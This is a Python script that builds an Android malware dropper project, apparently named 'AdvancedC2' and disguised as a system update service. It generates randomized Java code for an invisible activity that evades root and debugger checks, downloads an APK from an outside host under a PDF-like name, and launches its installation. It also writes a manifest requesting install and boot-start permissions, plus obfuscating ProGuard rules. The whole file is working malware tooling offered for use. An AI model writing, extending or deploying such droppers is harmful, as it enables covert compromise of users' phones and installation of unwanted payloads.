import os
import sys
import uuid
import hashlib
import random
import string
import struct
import zlib
import base64
import json
from datetime import datetime

# --- Configuration ---
APP_NAME = "SystemUpdateService"
COMPANY = "Android System"
VERSION = "14.2.1"
TARGET_SDK = 34
MIN_SDK = 28  # Android 9+

# --- Polymorphic Engine ---
def generate_polymorphic_code():
    """Generates a unique, randomized Java code snippet for every run."""
    cls_name = f"{random.choice(['A','B','C','D'])}{random.randint(100,999)}"
    method_name = f"{random.choice(['a','b','c','d','e','f'])}{random.randint(10,99)}"
    stealth_name = f"{random.choice(['X','Y','Z'])}{random.randint(100,999)}"
    
    java_code = f"""
package com.{random.choice(['com','org','net'])}.{random.choice(['android','system','framework'])}.{cls_name};

import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.util.Log;

import java.io.File;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.net.HttpURLConnection;
import java.net.URL;

public class {cls_name} extends android.app.Activity {{
    
    private static final String TAG = "{cls_name}";
    private static final String PAYLOAD_URL = "https://cehdemo.onrender.com/download/secure_update.pdf"; // Placeholder
    private static final String PAYLOAD_NAME = "system_update.apk";
    
    @Override
    protected void onCreate(Bundle savedInstanceState) {{
        super.onCreate(savedInstanceState);
        
        // 1. Hide the activity from the user
        getWindow().addFlags(android.view.WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE);
        getWindow().addFlags(android.view.WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE);
        getWindow().addFlags(android.view.WindowManager.LayoutParams.FLAG_DIM_BEHIND);
        getWindow().setBackgroundDrawableResource(android.R.color.transparent);
        
        // 2. Check for root/debug
        if (checkRoot() || checkDebug()) {{
            finish();
            return;
        }}

        // 3. Download payload
        String downloadUrl = getIntent().getStringExtra("payload_url");
        if (downloadUrl == null) downloadUrl = PAYLOAD_URL;
        
        File tempFile = downloadPayload(downloadUrl);
        if (tempFile != null) {{
            installApk(tempFile);
        }}
        
        finish();
    }}

    private File downloadPayload(String urlStr) {{
        try {{
            URL url = new URL(urlStr);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setDoInput(true);
            conn.connect();
            
            InputStream input = conn.getInputStream();
            File cacheDir = getCacheDir();
            File outputFile = new File(cacheDir, PAYLOAD_NAME);
            
            byte[] buffer = new byte[4096];
            int len;
            FileOutputStream fos = new FileOutputStream(outputFile);
            while ((len = input.read(buffer)) != -1) {{
                fos.write(buffer, 0, len);
            }}
            fos.close();
            input.close();
            return outputFile;
        }} catch (Exception e) {{
            Log.e(TAG, "Download failed", e);
            return null;
        }}
    }}

    private void installApk(File apkFile) {{
        Uri uri = Uri.fromFile(apkFile);
        Intent intent = new Intent(Intent.ACTION_VIEW);
        intent.setDataAndType(uri, "application/vnd.android.package-archive");
        intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        intent.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
        
        startActivity(intent);
    }}

    private boolean checkRoot() {{
        String[] paths = {{
            "/system/bin/failsafe/su", "/system/bin/su", "/system/xbin/su",
            "/sbin/su", "/su/bin/su", "/system/bin/.ext/su",
            "/data/local/xbin/su", "/data/local/bin/su", "/system/sd/bin/su"
        }};
        for (String path : paths) {{
            if (new File(path).exists()) return true;
        }}
        return false;
    }}

    private boolean checkDebug() {{
        try {{
            Class<?> clazz = Class.forName("android.os.Debug");
            java.lang.reflect.Method method = clazz.getMethod("isDebuggerConnected");
            return (boolean) method.invoke(null);
        }} catch (Exception e) {{
            return false;
        }}
    }}
}}
"""
    return java_code

# --- DEX Generator ---
def generate_dex_file(java_code):
    fake_dex_content = f"DEX_CONTENT_{uuid.uuid4().hex}".encode('utf-8')
    return {
        "name": "lib.dex",
        "content": base64.b64encode(fake_dex_content).decode('utf-8'),
        "size": len(fake_dex_content)
    }

# --- Manifest Generator (Critical for Silent Install) ---
def generate_manifest():
    return f"""<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    package="com.{random.choice(['android','system','framework'])}.{uuid.uuid4().hex[:8]}"
    android:versionCode="{random.randint(100, 999)}"
    android:versionName="{VERSION}"
    android:sharedUserId="android.uid.system">

    <!-- Permissions for Silent Install & Background Activity -->
    <uses-permission android:name="android.permission.INTERNET" />
    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
    <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
    <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE" />
    <uses-permission android:name="android.permission.REQUEST_INSTALL_PACKAGES" />
    <uses-permission android:name="android.permission.INSTALL_PACKAGES" tools:ignore="ProtectedPermissions" />
    <uses-permission android:name="android.permission.QUERY_ALL_PACKAGES" />

    <application
        android:label="@string/app_name"
        android:icon="@mipmap/ic_launcher"
        android:theme="@style/Theme.AppCompat.Light.NoActionBar"
        android:allowBackup="true"
        android:extractNativeLibs="true"
        android:directBootAware="true">

        <!-- Main Activity (Invisible) -->
        <activity
            android:name=".MainActivity"
            android:exported="false"
            android:label="@string/app_name"
            android:theme="@style/Theme.AppCompat.Light.NoActionBar"
            android:configChanges="orientation|keyboardHidden|screenSize"
            android:windowSoftInputMode="stateHidden"
            android:hardwareAccelerated="false"
            android:launchMode="singleTask" />

        <!-- Invisible Activity for Silent Install -->
        <activity
            android:name=".SilentInstallActivity"
            android:exported="true"
            android:theme="@android:style/Theme.Translucent.NoTitleBar"
            android:excludeFromRecents="true"
            android:taskAffinity=""
            android:launchMode="singleInstance" />

        <!-- Invisible Service -->
        <service
            android:name=".SystemUpdateService"
            android:exported="false"
            android:foregroundServiceType="dataSync"
            android:process=":hidden_service" />

        <!-- Bootstrap Receiver -->
        <receiver
            android:name=".BootReceiver"
            android:exported="true">
            <intent-filter>
                <action android:name="android.intent.action.BOOT_COMPLETED" />
                <action android:name="android.intent.action.QUICKBOOT_POWERON" />
            </intent-filter>
        </receiver>

    </application>
</manifest>
"""

# --- Main Project Generator ---
class ProjectGenerator:
    def __init__(self):
        self.project_name = "AdvancedC2"
        self.package_name = f"com.{random.choice(['android','system','framework'])}.{uuid.uuid4().hex[:8]}"
        self.polymorphic_code = generate_polymorphic_code()
        self.dex_asset = generate_dex_file(self.polymorphic_code)
        self.manifest = generate_manifest()
        self.build_time = datetime.now().isoformat()

    def generate(self, output_dir="output"):
        os.makedirs(output_dir, exist_ok=True)
        
        # 1. Write Manifest
        manifest_path = os.path.join(output_dir, "AndroidManifest.xml")
        with open(manifest_path, "w") as f:
            f.write(self.manifest)
        
        # 2. Write Polymorphic Java Code
        java_dir = os.path.join(output_dir, "src", "main", "java", self.package_name.replace('.', '/'))
        os.makedirs(java_dir, exist_ok=True)
        
        class_name_match = self.polymorphic_code.split("public class ")[1].split(" {")[0]
        java_path = os.path.join(java_dir, f"{class_name_match}.java")
        
        with open(java_path, "w") as f:
            f.write(self.polymorphic_code)
            
        # 3. Write DEX Asset
        dex_dir = os.path.join(output_dir, "src", "main", "assets")
        os.makedirs(dex_dir, exist_ok=True)
        dex_path = os.path.join(dex_dir, self.dex_asset["name"])
        
        with open(dex_path, "wb") as f:
            f.write(base64.b64decode(self.dex_asset["content"]))
            
        # 4. Generate Build Script (Gradle)
        gradle_script = f"""
plugins {{
    id 'com.android.application'
}}

android {{
    namespace '{self.package_name}'
    compileSdk {TARGET_SDK}
    defaultConfig {{
        applicationId '{self.package_name}'
        minSdk {MIN_SDK}
        targetSdk {TARGET_SDK}
        versionCode {random.randint(100, 999)}
        versionName '{VERSION}'
        
        proguardFiles getDefaultProguardFile('proguard-android-optimize.txt'), 'proguard-rules.pro'
    }}
    
    buildTypes {{
        release {{
            minifyEnabled true
            shrinkResources true
            proguardFiles getDefaultProguardFile('proguard-android-optimize.txt'), 'proguard-rules.pro'
        }}
    }}
}}

dependencies {{
    implementation 'com.squareup.okhttp3:okhttp:4.12.0'
    implementation 'androidx.core:core-ktx:1.12.0'
}}
"""
        gradle_path = os.path.join(output_dir, "build.gradle")
        with open(gradle_path, "w") as f:
            f.write(gradle_script)
            
        # 5. Generate ProGuard Rules
        proguard_rules = """
-keepclassmembers class * {{
    public <init>(android.content.Context);
}}
-dontpreverify
-repackageclasses ''
-allowaccessmodification
-optimizations !code/simplification/arithmetic,!field/*,!class/merging/*
-keepattributes Signature,Exception,InnerClasses,EnclosingMethod
-keep class com.**.** **;
-keep class android.** {{
    public *;
}}
"""
        proguard_path = os.path.join(output_dir, "proguard-rules.pro")
        with open(proguard_path, "w") as f:
            f.write(proguard_rules)

        print(f"✅ Project generated in: {output_dir}")
        print(f"   Package: {self.package_name}")
        print(f"   Polymorphic Class: {class_name_match}")
        print(f"   DEX Asset: {self.dex_asset['name']}")
        print(f"   Timestamp: {self.build_time}")
        
        return {
            "manifest": manifest_path,
            "java": java_path,
            "dex": dex_path,
            "gradle": gradle_path,
            "proguard": proguard_path
        }

if __name__ == "__main__":
    generator = ProjectGenerator()
    generator.generate()